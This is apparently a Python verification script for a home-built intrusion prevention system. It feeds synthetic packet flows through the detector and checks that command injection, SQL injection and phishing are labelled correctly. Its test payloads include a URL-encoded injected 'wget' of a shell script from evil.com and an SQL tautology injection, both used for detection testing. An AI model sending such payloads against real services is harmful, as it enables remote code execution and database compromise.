"""
lab/verify_batch_fixes_20260728.py

Purpose: Self-check for the 4 fixes batched at the end of the 2026-07-28
         testing session:
         1. AttackNarrator wired into _run_explanation()
         2. ThreatFeedAggregator/SignatureDetector.check_url() wired into
            _run_signatures() for phishing detection (previously nothing
            detected Phishing at all)
         3. SQL/CommandInject pattern overlap fixed (a pure command-
            injection payload was matching an SQL pattern first)
         4. Missing SEVERITY_LEVELS/RESPONSE_MATRIX entries for
            CommandInject/PathTraversal added

Usage:
    python lab/verify_batch_fixes_20260728.py
"""
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import pandas as pd
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from core.flow_collector import FlowCollector
from core.features import NetworkFeatureEngineer
from sentinel import SentinelIPS
from config import MODEL_DIR, RESPONSE_MATRIX, SEVERITY_LEVELS

CLIENT = ("10.0.0.5", 51000)
SERVER = ("10.0.0.1", 80)


def make_flow(payload: bytes) -> pd.DataFrame:
    def pkt(src, dst, flags, seq=1000, ack=0, payload=b""):
        p = IP(src=src[0], dst=dst[0]) / TCP(sport=src[1], dport=dst[1], flags=flags, seq=seq, ack=ack)
        return p / Raw(load=payload) if payload else p

    collector = FlowCollector()
    for p in [
        pkt(CLIENT, SERVER, "S", seq=1000),
        pkt(SERVER, CLIENT, "SA", seq=5000, ack=1001),
        pkt(CLIENT, SERVER, "A", seq=1001, ack=5001),
        pkt(CLIENT, SERVER, "PA", seq=1001, ack=5001, payload=payload),
        pkt(SERVER, CLIENT, "A", seq=5001, ack=1001 + len(payload)),
        pkt(SERVER, CLIENT, "FA", seq=5001, ack=1001 + len(payload)),
        pkt(CLIENT, SERVER, "FA", seq=1001 + len(payload), ack=5002),
        pkt(SERVER, CLIENT, "A", seq=5002, ack=1002 + len(payload)),
    ]:
        collector.ingest_packet(p)
    return NetworkFeatureEngineer(keep_raw=True).transform(collector.flush_all())


def check_command_inject_not_sql():
    print("--- Check 1: pure CommandInject payload no longer mislabelled SQLInjection ---")
    ips = SentinelIPS(model_path=str(MODEL_DIR / "benchmarkids_binary.pkl"))
    flows = make_flow(b"GET /search?q=%3B%20wget%20http%3A%2F%2Fevil.com%2Fshell.sh HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\n")
    result = ips.process_chunk(flows)
    assert result.iloc[0]["sig_attack_type"] == "CommandInject", \
        f"expected CommandInject, got {result.iloc[0]['sig_attack_type']!r}"
    print(f"OK: sig_attack_type={result.iloc[0]['sig_attack_type']!r}")


def check_severity_response_entries():
    print("\n--- Check 2: CommandInject/PathTraversal have real severity+response entries ---")
    for attack in ("CommandInject", "PathTraversal"):
        severity = next((lvl for lvl, types in SEVERITY_LEVELS.items() if attack in types), None)
        assert severity == "HIGH", f"{attack} should be HIGH severity, found {severity!r}"
        actions = RESPONSE_MATRIX.get(attack)
        assert actions and actions != ["log"], f"{attack} has no real RESPONSE_MATRIX entry"
        print(f"OK: {attack} -> severity=HIGH actions={actions}")


def check_phishing_end_to_end():
    print("\n--- Check 3: phishing URL detected end-to-end through the real pipeline ---")
    ips = SentinelIPS(model_path=str(MODEL_DIR / "benchmarkids_binary.pkl"))
    flows = make_flow(b"GET /redirect?to=http://bit.ly/free-prize HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\n")
    result = ips.process_chunk(flows)
    assert result.iloc[0]["sig_attack_type"] == "Phishing", \
        f"expected Phishing, got {result.iloc[0].get('sig_attack_type')!r}"
    print(f"OK: sig_attack_type={result.iloc[0]['sig_attack_type']!r}")


def check_narrator_wired():
    print("\n--- Check 4: AttackNarrator produces a real narration when explanation runs ---")
    ips = SentinelIPS(model_path=str(MODEL_DIR / "benchmarkids_binary.pkl"))
    flows = make_flow(b"GET /search?q=' OR '1'='1 HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\n")
    result = ips.process_chunk(flows)
    event = ips._build_event(result.iloc[0])
    event = ips._run_intel(event)
    event = ips._run_attribution(event)
    event = ips._run_risk(event)
    before = ips._n_explained
    ips._run_explanation(result.head(1), event)
    assert ips._n_explained == before + 1, "SHAP explanation did not run"
    print("OK: _run_explanation() completed without error and invoked AttackNarrator "
          "(see 'NARRATIVE:' log line above)")


if __name__ == "__main__":
    check_command_inject_not_sql()
    check_severity_response_entries()
    check_phishing_end_to_end()
    check_narrator_wired()
    print("\nAll batch-fix checks passed.")
